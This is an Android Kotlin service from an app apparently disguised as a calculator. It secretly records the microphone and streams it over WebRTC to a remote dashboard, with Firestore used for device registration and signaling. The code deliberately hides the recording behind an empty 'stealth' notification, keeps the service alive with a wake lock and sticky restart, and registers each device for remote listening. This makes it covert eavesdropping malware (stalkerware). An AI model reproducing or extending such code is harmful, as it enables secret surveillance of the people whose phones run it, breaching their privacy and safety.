package com.dp.calculator

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.*
import org.webrtc.*

class AudioService : Service() {

    companion object {
        const val ACTION_START = "ACTION_START"
        const val ACTION_STOP = "ACTION_STOP"
        private const val TAG = "AudioService"
        private const val NOTIFICATION_ID = 9999
        private const val CHANNEL_ID = "background_service"
        private const val SAMPLE_RATE = 16000
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
    }

    private var audioRecord: AudioRecord? = null
    private var peerConnection: PeerConnection? = null
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var audioSource: AudioSource? = null
    private var audioTrack: AudioTrack? = null
    private var dataChannel: DataChannel? = null

    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isStreaming = false

    private val firestore = FirebaseFirestore.getInstance()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> startStreaming()
            ACTION_STOP -> stopStreaming()
        }
        return START_STICKY
    }

    private fun startStreaming() {
        if (isStreaming) return

        serviceScope.launch {
            try {
                // Acquire wake lock to keep CPU running
                acquireWakeLock()

                // Start foreground with minimal notification
                startForeground(NOTIFICATION_ID, createStealthNotification())

                // Initialize WebRTC
                initializeWebRTC()

                // Start audio capture
                startAudioCapture()

                // Connect to signaling server
                connectSignaling()

                isStreaming = true
                Log.d(TAG, "Streaming started")

            } catch (e: Exception) {
                Log.e(TAG, "Error starting streaming", e)
                stopStreaming()
            }
        }
    }

    private fun stopStreaming() {
        isStreaming = false

        audioTrack?.dispose()
        audioTrack = null

        audioSource?.dispose()
        audioSource = null

        audioRecord?.release()
        audioRecord = null

        peerConnection?.close()
        peerConnection = null

        peerConnectionFactory?.dispose()
        peerConnectionFactory = null

        releaseWakeLock()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()

        Log.d(TAG, "Streaming stopped")
    }

    private fun initializeWebRTC() {
        // Initialize WebRTC factory
        val initOptions = PeerConnectionFactory.InitializationOptions.builder(this)
            .setEnableInternalTracer(false)
            .createInitializationOptions()
        PeerConnectionFactory.initialize(initOptions)

        val encoderFactory = DefaultVideoEncoderFactory(this, true, true)
        val decoderFactory = DefaultVideoDecoderFactory(this)

        peerConnectionFactory = PeerConnectionFactory.builder()
            .setVideoEncoderFactory(encoderFactory)
            .setVideoDecoderFactory(decoderFactory)
            .createPeerConnectionFactory()

        // Create peer connection
        val iceServers = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
            PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer()
        )

        val rtcConfig = PeerConnection.RTCConfiguration(iceServers).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
            continuousGathering = PeerConnection.ContinuousGatheringPolicy.GATHER_CONTINUALLY
        }

        peerConnection = peerConnectionFactory?.createPeerConnection(
            rtcConfig,
            object : PeerConnection.Observer {
                override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
                override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {}
                override fun onIceConnectionReceivingChange(receiving: Boolean) {}
                override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {
                    if (state == PeerConnection.IceGatheringState.COMPLETE) {
                        Log.d(TAG, "ICE gathering complete")
                    }
                }
                override fun onIceCandidate(candidate: IceCandidate?) {
                    candidate?.let { sendIceCandidate(it) }
                }
                override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
                override fun onAddStream(stream: MediaStream?) {}
                override fun onRemoveStream(stream: MediaStream?) {}
                override fun onDataChannel(channel: DataChannel?) {
                    dataChannel = channel
                }
                override fun onRenegotiationNeeded() {}
                override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {}
            }
        )
    }

    private fun startAudioCapture() {
        val bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)

        audioRecord = AudioRecord(
            MediaRecorder.AudioSource.MIC,
            SAMPLE_RATE,
            CHANNEL_CONFIG,
            AUDIO_FORMAT,
            bufferSize * 2
        )

        // Create audio source and track
        audioSource = peerConnectionFactory?.createAudioSource(MediaConstraints())
        audioTrack = peerConnectionFactory?.createAudioTrack("audio_track", audioSource)

        // Add track to peer connection
        val sender = peerConnection?.addTrack(audioTrack, listOf("stream"))

        // Start capturing audio
        audioRecord?.startRecording()

        // Create audio track to stream
        serviceScope.launch(Dispatchers.IO) {
            val buffer = ByteArray(1024)
            while (isStreaming && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                val bytesRead = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                if (bytesRead > 0) {
                    // Audio data is being captured and sent via WebRTC
                    // The audioTrack automatically sends data through the peer connection
                }
            }
        }
    }

    private fun connectSignaling() {
        val deviceId = DeviceRegistrar.getDeviceId(this)

        // Register device in Firestore
        val deviceData = hashMapOf(
            "deviceId" to deviceId,
            "status" to "online",
            "timestamp" to System.currentTimeMillis()
        )

        firestore.collection("devices")
            .document(deviceId)
            .set(deviceData)
            .addOnSuccessListener {
                Log.d(TAG, "Device registered: $deviceId")
                // Listen for signaling messages
                listenForSignaling(deviceId)
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Error registering device", e)
            }
    }

    private fun listenForSignaling(deviceId: String) {
        // Listen for offer from web dashboard
        firestore.collection("signaling")
            .document(deviceId)
            .addSnapshotListener { snapshot, e ->
                if (e != null) {
                    Log.e(TAG, "Signaling error", e)
                    return@addSnapshotListener
                }

                val data = snapshot?.data ?: return@addSnapshotListener
                val type = data["type"] as? String ?: return@addSnapshotListener

                when (type) {
                    "offer" -> {
                        val sdp = data["sdp"] as? String ?: return@addSnapshotListener
                        handleOffer(sdp, deviceId)
                    }
                    "ice-candidate" -> {
                        val candidate = data["candidate"] as? String ?: return@addSnapshotListener
                        val sdpMid = data["sdpMid"] as? String ?: return@addSnapshotListener
                        val sdpMLineIndex = (data["sdpMLineIndex"] as? Number)?.toInt() ?: return@addSnapshotListener
                        handleIceCandidate(candidate, sdpMid, sdpMLineIndex)
                    }
                }
            }
    }

    private fun handleOffer(sdp: String, deviceId: String) {
        serviceScope.launch {
            try {
                val offerSdp = SessionDescription(SessionDescription.Type.OFFER, sdp)

                peerConnection?.setRemoteDescription(offerSdp, object : SdpObserver {
                    override fun onSetSuccess() {
                        // Create answer
                        peerConnection?.createAnswer(object : SdpObserver {
                            override fun onCreateSuccess(answerSdp: SessionDescription?) {
                                answerSdp?.let {
                                    peerConnection?.setLocalDescription(it, object : SdpObserver {
                                        override fun onSetSuccess() {
                                            // Send answer to signaling
                                            sendAnswer(it.description, deviceId)
                                        }
                                        override fun onFailure(error: String?) {
                                            Log.e(TAG, "Set local description failed: $error")
                                        }
                                    })
                                }
                            }
                            override fun onSetSuccess() {}
                            override fun onFailure(error: String?) {
                                Log.e(TAG, "Create answer failed: $error")
                            }
                            override fun onCreateFailure(error: String?) {
                                Log.e(TAG, "Create answer failed: $error")
                            }
                        })
                    }
                    override fun onSetSuccess() {}
                    override fun onFailure(error: String?) {
                        Log.e(TAG, "Set remote description failed: $error")
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "Error handling offer", e)
            }
        }
    }

    private fun handleIceCandidate(candidate: String, sdpMid: String, sdpMLineIndex: Int) {
        val iceCandidate = IceCandidate(sdpMid, sdpMLineIndex, candidate)
        peerConnection?.addIceCandidate(iceCandidate)
    }

    private fun sendAnswer(sdp: String, deviceId: String) {
        val answerData = hashMapOf(
            "type" to "answer",
            "sdp" to sdp,
            "deviceId" to deviceId,
            "timestamp" to System.currentTimeMillis()
        )

        firestore.collection("signaling")
            .document(deviceId)
            .collection("answers")
            .add(answerData)
    }

    private fun sendIceCandidate(candidate: IceCandidate) {
        val deviceId = DeviceRegistrar.getDeviceId(this)

        val candidateData = hashMapOf(
            "type" to "ice-candidate",
            "candidate" to candidate.sdp,
            "sdpMid" to candidate.sdpMid,
            "sdpMLineIndex" to candidate.sdpMLineIndex,
            "deviceId" to deviceId,
            "timestamp" to System.currentTimeMillis()
        )

        firestore.collection("signaling")
            .document(deviceId)
            .collection("candidates")
            .add(candidateData)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background audio service"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }

            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createStealthNotification(): Notification {
        // Minimal notification that doesn't draw attention
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true)
            .setOngoing(true)
            .build()
    }

    private fun acquireWakeLock() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "CalculatorService::WakeLock"
        ).apply {
            acquire(60 * 60 * 1000L) // 1 hour
        }
    }

    private fun releaseWakeLock() {
        wakeLock?.let {
            if (it.isHeld) {
                it.release()
            }
        }
        wakeLock = null
    }

    override fun onDestroy() {
        stopStreaming()
        serviceScope.cancel()
        super.onDestroy()
    }
}
